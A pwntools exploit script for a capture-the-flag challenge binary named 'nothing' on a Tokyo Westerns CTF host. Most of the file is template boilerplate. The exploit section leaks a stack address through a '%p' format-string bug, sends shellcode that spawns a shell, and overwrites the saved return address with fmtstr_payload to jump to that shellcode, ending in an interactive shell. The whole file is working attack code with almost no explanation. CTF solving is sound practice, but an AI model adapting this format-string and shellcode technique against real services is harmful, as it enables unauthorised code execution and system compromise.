#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host pwn02.chal.ctf.westerns.tokyo --port 18247
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = '/mnt/d/downloads/nothing'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'pwn02.chal.ctf.westerns.tokyo'
port = int(args.PORT or 18247)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        context.terminal = ["tmux", "splitw", "-h"]
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()



io.recvuntil(">")
io.sendline("%p")
addr = int( io.recvuntilS("\n", drop = True), 16)
print(hex(addr))
rip = addr + 0x108
print(hex(rip))
shellcode = asm(shellcraft.sh())
print(len(shellcode))
print(shellcode)
payload = fmtstr_payload(6, {rip : addr}, numbwritten = len(shellcode))
print(payload)
io.recvuntil(">")
io.send(shellcode)
io.sendline(payload)
io.recvuntil(">")
io.sendline("q")
# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()
